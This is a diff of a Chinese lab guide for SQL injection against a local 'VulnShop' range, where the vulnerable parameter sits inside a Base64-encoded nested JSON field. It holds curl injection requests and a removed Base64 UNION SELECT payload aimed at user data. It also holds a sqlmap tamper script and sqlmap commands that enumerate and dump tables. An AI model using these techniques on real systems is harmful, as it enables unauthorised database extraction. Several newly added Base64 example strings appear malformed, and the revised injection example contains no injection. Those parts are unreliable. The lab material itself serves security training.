@@ -6,7 +6,7 @@
 
 某些 API 接口使用嵌套加密参数结构：
 - 外层是标准 JSON 格式
-- 其中某个字段（如 `content`）包含 Base64 编码的数据
+- 其中某个字段（如 `data`）包含 Base64 编码的数据
 - Base64 解码后是另一个 JSON，包含实际的业务参数
 - 内层参数存在 SQL 注入漏洞
 
@@ -15,16 +15,16 @@
 ```json
 {
     "req_id": "123456",
-    "content": "eyJuYW1lIjogIkFsaWNlIiwgImFnZSI6IDE4fQ=="
+    "data": "eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="
 }
 ```
 
-`content` 字段 Base64 解码后：
+`data` 字段 Base64 解码后：
 ```json
-{"name": "Alice", "age": 18}
+{"coupon_code": "SAVE10"}
 ```
 
-注入点在 `name` 字段。
+注入点在 `coupon_code` 字段。
 
 ## VulnShop 靶场测试接口
 
@@ -32,11 +32,11 @@
 
 | 接口 | 注入类型 | 说明 |
 |------|----------|------|
-| `POST /api/encrypted/user/query` | 基于错误的注入 | 查询用户，返回错误信息 |
-| `POST /api/encrypted/product/search` | 布尔盲注 | 商品搜索 |
-| `POST /api/encrypted/order/query` | 时间盲注 | 订单查询 |
-| `POST /api/encrypted/debug/decode` | 调试 | 解码 content 字段 |
-| `POST /api/encrypted/debug/encode` | 调试 | 编码 content 字段 |
+| `POST /api/coupon/query` | 基于错误的注入 | 查询优惠券，返回错误信息 |
+| `POST /api/coupon/search` | 布尔盲注 | 优惠券搜索 |
+| `POST /api/coupon/by-category` | 时间盲注 | 按分类查询优惠券 |
+| `POST /api/coupon/debug/decode` | 调试 | 解码 data 字段 |
+| `POST /api/coupon/debug/encode` | 调试 | 编码 data 字段 |
 
 ## 手动测试方法
 
@@ -44,41 +44,44 @@
 
 ```bash
 # 编码 payload
-curl -X POST http://127.0.0.1:9527/api/encrypted/debug/encode \
+curl -X POST http://127.0.0.1:9527/api/coupon/debug/encode \
   -H "Content-Type: application/json" \
-  -d '{"data":{"name":"admin","age":18}}'
+  -d '{"data":{"coupon_code":"SAVE10"}}'
 
-# 响应：{"encoded": "eyJuYW1lIjogImFkbWluIiwgImFnZSI6IDE4fQ=="}
+# 响应：{"success": true, "encoded": "eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="}
 ```
 
 ### 2. 发送注入请求
 
 ```bash
 # 正常请求
-curl -X POST http://127.0.0.1:9527/api/encrypted/user/query \
+curl -X POST http://127.0.0.1:9527/api/coupon/query \
   -H "Content-Type: application/json" \
-  -d '{"req_id":"1","content":"eyJuYW1lIjogImFkbWluIiwgImFnZSI6IDE4fQ=="}'
+  -d '{"req_id":"1","data":"eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="}'
 
 # SQL 注入（Base64 编码的 payload）
-curl -X POST http://127.0.0.1:9527/api/encrypted/user/query \
+curl -X POST http://127.0.0.1:9527/api/coupon/query \
   -H "Content-Type: application/json" \
-  -d '{"req_id":"1","content":"eyJuYW1lIjogImFkbWluJyBVTklPTiBTRUxFQ1QgaWQsIHVzZXJuYW1lLCBlbWFpbCwgcGhvbmUsIGFkZHJlc3MsIGJhbGFuY2UgRlJPTSB1c2Vycy0tIiwgImFnZSI6IDE4fQ=="}'
+  -d '{"req_id":"1","data":"eyJjb3Vwb25fY29kZSI6ICJTQVZFMTANIFQ=="}'
 ```
 
 ## SQLMap 自动化测试
 
 ### 使用 Tamper 脚本
 
-创建 `base64_nested.py` 文件（放在 SQLMap 的 tamper 目录）：
+使用本目录下的 `tamper_script.py`（放在 SQLMap 的 tamper 目录或使用完整路径）：
 
 ```python
-#!/usr/bin/env python3
+#!/usr/bin/env python
 import base64
 import json
 from lib.core.enums import PRIORITY
 from lib.core.settings import UNICODE_ENCODING
 
 __priority__ = PRIORITY.NORMAL
+
+INNER_PARAM = "coupon_code"
+INNER_DATA_TEMPLATE = {}
 
 def dependencies():
     pass
@@ -89,23 +92,14 @@ def tamper(payload, **kwargs):
     """
     if not payload:
         return payload
-    
+
     try:
-        # 移除原始 "test" 前缀
-        injection = payload
-        if payload.startswith("test"):
-            injection = payload[4:]
-        
-        # 构建内层 JSON
-        inner_data = {
-            "name": "test" + injection,
-            "age": 18
-        }
-        
-        # Base64 编码
+        inner_data = INNER_DATA_TEMPLATE.copy()
+        inner_data[INNER_PARAM] = payload
+
         inner_json = json.dumps(inner_data, ensure_ascii=False)
         encoded = base64.b64encode(inner_json.encode(UNICODE_ENCODING)).decode(UNICODE_ENCODING)
-        
+
         return encoded
     except:
         return payload
@@ -114,10 +108,10 @@ def tamper(payload, **kwargs):
 ### 运行 SQLMap
 
 ```bash
-python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
-  --data='{"req_id":"1","content":"test"}' \
-  --tamper=base64_nested \
-  -p content \
+python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
+  --data='{"req_id":"1","data":"test"}' \
+  --tamper=tamper_script \
+  -p data \
   --batch
 ```
 
@@ -125,29 +119,31 @@ python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
 
 ```bash
 # 获取表名
-python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
-  --data='{"req_id":"1","content":"test"}' \
-  --tamper=base64_nested -p content --batch --tables
+python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
+  --data='{"req_id":"1","data":"test"}' \
+  --tamper=tamper_script -p data --batch --tables
 
 # 获取列名
-python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
-  --data='{"req_id":"1","content":"test"}' \
-  --tamper=base64_nested -p content --batch --columns -T users
+python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
+  --data='{"req_id":"1","data":"test"}' \
+  --tamper=tamper_script -p data --batch --columns -T coupons
 
 # 导出数据
-python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
-  --data='{"req_id":"1","content":"test"}' \
-  --tamper=base64_nested -p content --batch --dump -T users
+python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
+  --data='{"req_id":"1","data":"test"}' \
+  --tamper=tamper_script -p data --batch --dump -T coupons
 ```
 
 ### 使用 Preprocess 脚本（推荐复杂场景）
 
 当需要修改整个请求（包括 headers、多字段处理、响应解码等）时，使用 preprocess 脚本更合适。
 
+**工作原理**：SQLMap 将其 payload 作为纯字符串注入 `data` 字段，preprocess 函数在发送前对该字段值进行 Base64 编码；postprocess 函数在收到响应后对 `data` 字段进行 Base64 解码，让 SQLMap 能够读取明文内容。
+
 #### Preprocess vs Tamper 的区别
 
 | 特性 | Tamper 脚本 | Preprocess 脚本 |
-|------|-------------|-----------------|
+|------|-------------|------------------|
 | 作用范围 | 只修改注入参数值 | 修改整个 HTTP 请求 |
 | 调用时机 | SQLMap 生成 payload 后 | 请求发送前 |
 | 功能 | 编码/加密 payload | 修改 headers、body、处理响应等 |
@@ -156,10 +152,10 @@ python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
 #### Preprocess 脚本使用
 
 ```bash
-python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
-  --data='{"req_id":"1","content":"eyJuYW1lIjoidGVzdCIsImFnZSI6MTh9"}' \
+python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
+  --data='{"req_id":"1","data":"{\"coupon_code\":\"SAVE10\"}"}' \
   --preprocess=preprocess_script.py \
-  -p content \
+  -p data \
   --batch
 ```
 
@@ -186,11 +182,11 @@ python sqlmap.py -u "http://127.0.0.1:9527/api/encrypted/user/query" \
 3. 手动构造请求：
 
 ```
-POST /api/encrypted/user/query HTTP/1.1
+POST /api/coupon/query HTTP/1.1
 Host: 127.0.0.1:9527
 Content-Type: application/json
 
-{"req_id":"1","content":"eyJuYW1lIjoiYWRtaW4iLCAiYWdlIjoxOH0="}
+{"req_id":"1","data":"eyJjb3Vwb25fY29kZSI6ICJTQVZFMTAIFQ=="}
 ```
 
 4. 在 "高级配置" 中添加 tamper 脚本路径
@@ -215,7 +211,7 @@ Content-Type: application/json
    - **使用完整路径**：`--tamper=/absolute/path/to/script.py` 或 `--preprocess=/absolute/path/to/script.py`
 
 3. **响应处理**：
-   - 靶场的响应也是 Base64 编码的
+   - 靶场的响应 `data` 字段也是 Base64 编码的
    - SQLMap 可能无法自动解析响应内容
    - 建议结合手动验证使用
 
